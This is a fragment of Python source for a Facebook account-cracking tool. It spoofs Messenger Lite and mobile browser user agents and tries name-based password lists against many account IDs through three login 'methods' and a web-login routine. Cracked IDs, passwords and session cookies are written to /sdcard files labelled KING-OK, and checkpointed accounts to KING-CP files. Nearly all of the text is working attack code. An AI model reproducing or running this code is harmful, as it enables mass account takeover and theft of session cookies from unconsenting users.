...
#<------[main-ua]---->M3
def riazfile():
    END = 'Davik/2.1.0 (Linux; U; Android 8.0.0; SM-G955U Build/R16NW) [FBAN/MessengerLite;FBAV/310.0.0.4.103;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/450821329;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-G955U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
...
def method_crack():
    global methods
    clear()
    print('[1] Method (update)')
    print('[2] Method')
    print('[3] Method (update)')
    linex()
...
#<----[pass_list]------>           
    def pasw(self):       
            ...
            print(f" [+] Total Acount :  {total_id}  (Use Airplane Mode)")
...
#<-----[Method~1]---->            
    def method1(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [D.O.D M,1] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m [KING-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/KING-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m [KING-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/KING-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue 
            loop+=1
...
#<-----[Method~2]------>            
    def methodB(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [D.O.D M,2] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;92m [KING-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/KING-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[KING-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
...
#<----[Method~3]----->
    def method3(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [D.O.D M,3] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r\x1b[1;97m [\033[1;97m D.O.D\033[1;97m] %s|\x1b[1;92mOK: %s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			...
			'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2683.125 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m [KING-OK] '+cid+' | '+ps+'\033[1;32m')
				open('KING.RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m [KING-CP] '+cid+' | '+ps+'\33[0;97m')
				open('KING.RNDM-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue 
